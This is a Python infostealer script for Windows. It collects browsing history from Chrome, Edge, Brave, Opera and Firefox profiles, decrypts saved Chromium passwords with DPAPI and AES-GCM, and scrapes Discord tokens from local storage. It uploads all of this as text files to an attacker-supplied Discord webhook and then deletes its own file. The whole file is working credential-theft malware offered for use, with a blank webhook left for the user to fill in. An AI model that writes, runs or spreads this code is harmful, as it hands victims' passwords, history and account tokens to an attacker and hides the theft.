import os
import sys
import json
import sqlite3
import shutil
import requests
import base64
import win32crypt
from io import BytesIO

try:
	from Crypto.Cipher import AES
except ImportError:
	AES=None

WEBHOOK_URL="" # <-- insert your webhook here


def safe_copy(db_path:str)->str|None:
	tmp=f"{db_path}_tmp"
	try:
		shutil.copy2(db_path,tmp);return tmp
	except Exception as e:
		print(f"[safe_copy] Failed {db_path}: {e}")
		return None


def get_chrome_key(local_state_path):
	if not os.path.exists(local_state_path):return None
	try:
		with open(local_state_path,"r",encoding="utf-8")as f:
			data=json.load(f)
		key_b64=data["os_crypt"]["encrypted_key"]
		key=base64.b64decode(key_b64)[5:] # Remove 'DPAPI'
		return win32crypt.CryptUnprotectData(key,None,None,None,0)[1]
	except Exception as e:
		print(f"[get_chrome_key] Error: {e}")
		return None


def decrypt_password(enc_pass,key=None):
	if not enc_pass:return ""
	try:
		if enc_pass.startswith(b'v10'):
			if AES is None or key is None:return "<MISSING_PYCRYPTODOME>"
			nonce=enc_pass[3:15]
			cipherbytes=enc_pass[15:-16]
			tag=enc_pass[-16:]
			cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
			return cipher.decrypt_and_verify(cipherbytes,tag).decode()
		else:
			return win32crypt.CryptUnprotectData(enc_pass,None,None,None,0)[1].decode()
	except Exception as e:
		return f"<DECRYPT_ERROR:{e}>"

def fetch_history(db_path:str,browser:str)->list:
	temp=safe_copy(db_path);rows=[]
	if not temp:return []
	try:
		conn=sqlite3.connect(temp);cur=conn.cursor()
		tbl="moz_places"if browser=="Firefox"else"urls"
		col="last_visit_date"if browser=="Firefox"else"last_visit_time"
		cur.execute(f"SELECT url,title FROM {tbl} ORDER BY {col} DESC")
		rows=cur.fetchall()
	except Exception as e:
		print(f"[fetch_history]{db_path}:{e}")
	finally:
		if conn:conn.close()
		if os.path.exists(temp):os.remove(temp)
	return rows


def fetch_login(db_path:str,key=None)->list:
	temp=safe_copy(db_path);rows=[]
	if not temp:return []
	try:
		conn=sqlite3.connect(temp);cur=conn.cursor()
		cur.execute("SELECT origin_url,username_value,password_value,date_last_used FROM logins ORDER BY date_last_used DESC")
		for h,u,p,t in cur.fetchall():
			decrypted=decrypt_password(p,key);rows.append((h,u,decrypted,t))
	except Exception as e:
		print(f"[fetch_login]{db_path}:{e}")
	finally:
		if conn:conn.close()
		if os.path.exists(temp):os.remove(temp)
	return rows


import re


def fetch_discord_tokens_chromium(prof_path):
	leveldb_path=os.path.join(prof_path,"Local Storage","leveldb")
	if not os.path.exists(leveldb_path):return []
	token_regex=re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
	tokens=set()
	for filename in os.listdir(leveldb_path):
		if not filename.endswith((".log",".ldb")):continue
		file_path=os.path.join(leveldb_path,filename)
		try:
			with open(file_path,"r",errors="ignore")as f:
				content=f.read();matches=token_regex.findall(content)
				for match in matches:
					tokens.add(match)
		except Exception as e:
			print(f"[fetch_discord_tokens_chromium]{file_path}:{e}")
	return list(tokens)


def get_chromium_profiles(base_path:str)->list[str]:
	if not os.path.exists(base_path):return []
	profiles=[]
	for prof in os.listdir(base_path):
		login_file=os.path.join(base_path,prof,"Login Data")
		if os.path.isfile(login_file):profiles.append(os.path.join(base_path,prof))
	return profiles


def get_firefox_profiles()->list[str]:
	base=os.path.join(os.path.expanduser("~"),"AppData","Roaming","Mozilla","Firefox","Profiles")
	if not os.path.exists(base):return []
	profiles=[]
	for p in os.listdir(base):
		places=os.path.join(base,p,"places.sqlite")
		if os.path.isfile(places):profiles.append(os.path.join(base,p))
	return profiles


def get_all_profiles()->dict[str,list[str]]:
	local=os.path.join(os.path.expanduser("~"),"AppData","Local")
	browsers={
		"Chrome":get_chromium_profiles(os.path.join(local,"Google","Chrome","User Data")),
		"Edge":get_chromium_profiles(os.path.join(local,"Microsoft","Edge","User Data")),
		"Brave":get_chromium_profiles(os.path.join(local,"BraveSoftware","Brave-Browser","User Data")),
		"Opera":get_chromium_profiles(os.path.join(local,"Opera Software","Opera Stable")),
		"Opera GX":get_chromium_profiles(os.path.join(local,"Opera Software","Opera GX Stable")),
		"Firefox":get_firefox_profiles(),
	}
	return{k:v for k,v in browsers.items()if v}


def send_to_discord(histories:dict[str,list[str]]):
	history_text="";passwords_text="";tokens_text=""
	for browser,profiles in histories.items():
		for prof_path in profiles:
			prof_name=os.path.basename(prof_path)

			key=None
			if browser!="Firefox":
				local_state=os.path.join(os.path.dirname(prof_path),"Local State")
				key=get_chrome_key(local_state)

			hist_file="places.sqlite"if browser=="Firefox"else"History"
			hist_rows=fetch_history(os.path.join(prof_path,hist_file),browser)
			history_text+=f"\n=== {browser} ({prof_name}) ===\n"
			for url,title in hist_rows:
				history_text+=f"{title}|{url}\n"
			history_text+="\n"

			if browser!="Firefox":
				login_rows=fetch_login(os.path.join(prof_path,"Login Data"),key)
				passwords_text+=f"\n=== {browser} ({prof_name}) ===\n"
				for h,u,p,t in login_rows:
					passwords_text+=f"{h}\t{u}\t{p}\t{t}\n"
				passwords_text+="\n"

				tokens=fetch_discord_tokens_chromium(prof_path)
				if tokens:
					tokens_text+=f"\n=== DISCORD TOKENS ({browser}/{prof_name}) ===\n"+'\n'.join(tokens)+'\n'

	files={
	    "history.txt":BytesIO(history_text.encode("utf-8")),
	    "passwords.txt":BytesIO(passwords_text.encode("utf-8")),
	    }
	files["history.txt"].name="history.txt"
	files["passwords.txt"].name="passwords.txt"

	if tokens_text.strip():
		files["discord_tokens.txt"]=BytesIO(tokens_text.encode("utf-8"))
		files["discord_tokens.txt"].name="discord_tokens.txt"

	try:
		r=requests.post(WEBHOOK_URL,files=files)
		print(f"\nSent! ({r.status_code})\n")
	except Exception as e:
		print("Error sending:",e)


if __name__=="__main__":
	all_profiles=get_all_profiles()
	if not all_profiles:
		print("No browsers found")
	else:
		send_to_discord(all_profiles)
try:
    scriptpath = os.path.abspath(sys.argv[0])
    os.remove(scriptpath)
except Exception as e:
    print(f"Error removing script: {e}")
